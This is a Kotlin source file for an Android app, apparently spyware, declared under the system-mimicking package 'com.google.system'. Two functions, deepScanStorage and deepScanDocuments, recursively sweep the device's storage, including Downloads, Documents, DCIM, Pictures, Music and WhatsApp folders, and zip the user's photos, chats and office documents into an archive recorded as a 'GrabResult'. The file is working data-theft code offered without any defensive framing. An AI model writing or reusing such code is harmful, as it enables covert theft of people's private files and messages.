package com.google.system

import android.content.Context
import android.os.Environment
import java.io.File
import java.util.zip.ZipOutputStream

internal fun deepScanStorage(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    val dirs = listOfNotNull(
        Environment.getExternalStorageDirectory(),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
        File(Environment.getExternalStorageDirectory(), "Android/data"),
        File("/sdcard/Download"),
        File("/sdcard/Documents"),
        File("/sdcard/DCIM"),
        File("/sdcard/Pictures"),
        File("/sdcard/Music"),
        File("/sdcard/WhatsApp"),
    )
    val found = mutableListOf<File>()
    for (root in dirs) {
        if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
        if (root.exists() && root.canRead()) collectDeep(root, found, MAX_FILES)
    }
    for (f in found) {
        if (r.size >= MAX_ZIP) break
        val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
        val rel = f.absolutePath.substring(root.absolutePath.length + 1)
        if (zip(f, "storage/$rel", zos)) { r.files++; r.size += f.length() }
    }
}

internal fun deepScanDocuments(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    val docExts = setOf(".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv")
    val dirs = listOfNotNull(
        Environment.getExternalStorageDirectory(),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
        File("/sdcard/Download"),
        File("/sdcard/Documents"),
        File("/sdcard/WhatsApp"),
    )
    val found = mutableListOf<File>()
    for (root in dirs) {
        if (found.size >= MAX_FILES || r.size >= MAX_ZIP) break
        if (root.exists() && root.canRead()) collectDeepExts(root, found, MAX_FILES, docExts)
    }
    for (f in found) {
        if (r.size >= MAX_ZIP) break
        val root = dirs.firstOrNull { f.absolutePath.startsWith(it.absolutePath) } ?: continue
        val rel = f.absolutePath.substring(root.absolutePath.length + 1)
        if (zip(f, "documents/$rel", zos)) { r.files++; r.size += f.length(); r.docsFound++ }
    }
}
